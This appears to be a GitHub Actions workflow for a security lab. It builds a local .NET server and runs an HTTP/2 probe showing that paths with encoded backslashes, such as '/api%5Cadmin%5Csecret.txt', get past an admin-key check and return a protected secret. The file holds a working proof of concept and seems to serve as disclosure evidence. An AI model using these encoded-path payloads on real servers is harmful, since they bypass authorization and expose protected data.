name: Nested Map HTTP2 evidence

on:
  push:
    branches:
      - lab/kestrel-chunk-extensions-20260920
    paths:
      - '.github/workflows/nested-map-http2-evidence.yml'
      - 'labs/nested-map-evidence/**'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  windows-http2-local:
    runs-on: windows-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 11.0.100-rc.1.26425.128

      - name: Build local evidence server and install h2 client library
        shell: pwsh
        run: |
          dotnet build .\labs\nested-map-evidence\NestedMapEvidence.csproj -c Release -p:EvidenceTfm=net11.0
          python -m pip install --disable-pip-version-check h2

      - name: Run loopback HTTP2 cases
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $env:SCENARIO = 'map'
          $env:PROTOCOL = 'http2'
          $env:PORT = '5050'
          $env:NORMALIZE_BACKSLASH = '0'

          $serverLog = Join-Path $PWD 'http2-server.log'
          $serverErr = Join-Path $PWD 'http2-server.err'
          $proc = Start-Process dotnet -ArgumentList @(
            'run','--no-build','-c','Release',
            '--project','.\labs\nested-map-evidence\NestedMapEvidence.csproj',
            '-p:EvidenceTfm=net11.0'
          ) -RedirectStandardOutput $serverLog -RedirectStandardError $serverErr -PassThru

          try {
            for ($i = 0; $i -lt 80; $i++) {
              try {
                $tcp = [System.Net.Sockets.TcpClient]::new('127.0.0.1',5050)
                $tcp.Dispose()
                break
              } catch {
                Start-Sleep -Milliseconds 250
              }
            }

            New-Item -ItemType Directory -Force -Path http2-results | Out-Null

            @'
          import hashlib
          import json
          import socket

          from h2.config import H2Configuration
          from h2.connection import H2Connection
          from h2.events import DataReceived, ResponseReceived, StreamEnded, StreamReset

          HOST = "127.0.0.1"
          PORT = 5050

          def send_case(name, path, authenticated=False):
              sock = socket.create_connection((HOST, PORT), timeout=5)
              sock.settimeout(5)

              conn = H2Connection(config=H2Configuration(client_side=True, header_encoding="utf-8"))
              conn.initiate_connection()
              sock.sendall(conn.data_to_send())

              stream_id = conn.get_next_available_stream_id()
              headers = [
                  (":method", "GET"),
                  (":authority", f"{HOST}:{PORT}"),
                  (":scheme", "http"),
                  (":path", path),
              ]
              if authenticated:
                  headers.append(("x-admin-key", "research-only"))

              conn.send_headers(stream_id, headers, end_stream=True)
              sock.sendall(conn.data_to_send())

              response_headers = []
              body = bytearray()
              done = False

              while not done:
                  data = sock.recv(65535)
                  if not data:
                      break

                  for event in conn.receive_data(data):
                      if isinstance(event, ResponseReceived) and event.stream_id == stream_id:
                          response_headers = list(event.headers)
                      elif isinstance(event, DataReceived) and event.stream_id == stream_id:
                          body.extend(event.data)
                          conn.acknowledge_received_data(event.flow_controlled_length, stream_id)
                      elif isinstance(event, StreamEnded) and event.stream_id == stream_id:
                          done = True
                      elif isinstance(event, StreamReset) and event.stream_id == stream_id:
                          raise RuntimeError(f"stream reset: {event.error_code}")

                  pending = conn.data_to_send()
                  if pending:
                      sock.sendall(pending)

              sock.close()
              header_map = dict(response_headers)
              body_bytes = bytes(body)
              return {
                  "name": name,
                  "path": path,
                  "authenticated": authenticated,
                  "status": int(header_map.get(":status", "0")),
                  "response_headers": response_headers,
                  "body_text": body_bytes.decode("utf-8", "replace"),
                  "body_sha256": hashlib.sha256(body_bytes).hexdigest().upper(),
                  "contains_secret": b"TOP_SECRET_7B4F" in body_bytes,
              }

          results = [
              send_case("normal_no_auth", "/api/admin/secret.txt", False),
              send_case("normal_with_auth", "/api/admin/secret.txt", True),
              send_case("encoded_parent_boundary", "/api%5Cadmin%5Csecret.txt", False),
              send_case("encoded_parent_boundary_mixed", "/api%5Cadmin/secret.txt", False),
              send_case("encoded_child_boundary", "/api/admin%5Csecret.txt", False),
          ]

          with open("http2-results/results.json", "w", encoding="utf-8") as f:
              json.dump(results, f, indent=2)

          print(json.dumps(results, indent=2))

          by_name = {item["name"]: item for item in results}
          assert by_name["normal_no_auth"]["status"] == 401
          assert by_name["normal_with_auth"]["status"] == 200
          assert by_name["normal_with_auth"]["contains_secret"] is True
          assert by_name["encoded_parent_boundary"]["status"] == 200
          assert by_name["encoded_parent_boundary"]["contains_secret"] is True
          assert by_name["encoded_parent_boundary_mixed"]["status"] == 200
          assert by_name["encoded_parent_boundary_mixed"]["contains_secret"] is True
          assert by_name["encoded_child_boundary"]["status"] == 401
          assert by_name["encoded_child_boundary"]["contains_secret"] is False

          expected_hash = by_name["normal_with_auth"]["body_sha256"]
          assert by_name["encoded_parent_boundary"]["body_sha256"] == expected_hash
          assert by_name["encoded_parent_boundary_mixed"]["body_sha256"] == expected_hash
          '@ | Set-Content http2_probe.py

            python http2_probe.py
            if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

            Start-Sleep -Milliseconds 500
            Write-Host '=== SERVER LOG ==='
            Get-Content $serverLog
            Write-Host '=== SERVER ERR ==='
            Get-Content $serverErr

            if (-not ((Get-Content $serverLog -Raw) -match 'HTTP/2')) {
              throw 'Server log did not confirm HTTP/2 request processing.'
            }
          }
          finally {
            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
          }

      - name: Upload HTTP2 evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: nested-map-http2-windows
          path: |
            http2-results
            http2-server.log
            http2-server.err
